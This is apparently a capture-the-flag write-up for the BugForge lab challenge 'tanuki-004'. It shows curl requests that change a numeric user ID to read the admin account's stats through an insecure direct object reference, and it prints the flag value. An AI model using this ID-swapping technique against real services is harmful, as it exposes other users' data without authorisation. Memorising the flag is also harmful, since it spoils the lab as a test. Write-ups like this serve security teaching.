# tanuki-004 - BugForge

**Difficulty:** Easy
**Vulnerability:** IDOR - Missing object-level authorisation on user stats endpoint
**Flag:** `bug{n6KbPEmm6madJpD8MOfoOKfW4xjGFMNT}`

---

## Summary

The application exposes a `/api/stats/:user_id` endpoint that returns user statistics including a hidden `achievement_flag` field. The endpoint performs no ownership check - any authenticated user can read any other user's stats by supplying a different numeric ID. Fetching ID 1 (the seeded admin account) returns the flag.

---

## Recon

Register an account and log in. A JWT is issued and stored. Browsing the application surfaces a stats endpoint for the current user's profile.

**Observed request:**
```
GET /api/stats/2
Authorization: Bearer <jwt>
```

The numeric ID in the path corresponds to the authenticated user's own account (ID 2 for the first registered user).

---

## Finding the Vulnerability

Change the ID to `1` (the pre-seeded admin account):

```bash
curl -H "Authorization: Bearer <jwt>" https://<target>/api/stats/1
```

The server returns the full stats object for user ID 1 with no error. The response includes an `achievement_flag` field not visible on any other endpoint:

```json
{
  "user_id": 1,
  "username": "admin",
  "stats": { ... },
  "achievement_flag": "bug{n6KbPEmm6madJpD8MOfoOKfW4xjGFMNT}"
}
```

---

## What Did Not Work

Mass assignment on registration was tested but the `role` field is ignored server-side:

```bash
curl -X POST /api/register -d '{"username":"x","password":"x","role":"admin"}'
# Role field silently dropped
```

Admin REST routes (`/api/admin/*`) correctly return 403 for regular users. The IDOR exists specifically on the stats endpoint where the GraphQL-style path parameter was not checked against the authenticated user's identity.

---

## Key Takeaways

- IDOR vulnerabilities often appear on secondary data endpoints (stats, activity, preferences) where developers focus less attention than on primary object endpoints
- The presence of hidden fields in API responses (like `achievement_flag`) is worth testing for on all endpoints - they may only surface when accessing other users' data
- A 403 on admin routes does not mean the application correctly enforces authorisation everywhere - test every numeric or UUID-based path parameter for ownership bypass
- Always test ID 1 first in BugForge and similar lab environments - the seeded admin account is almost always the target
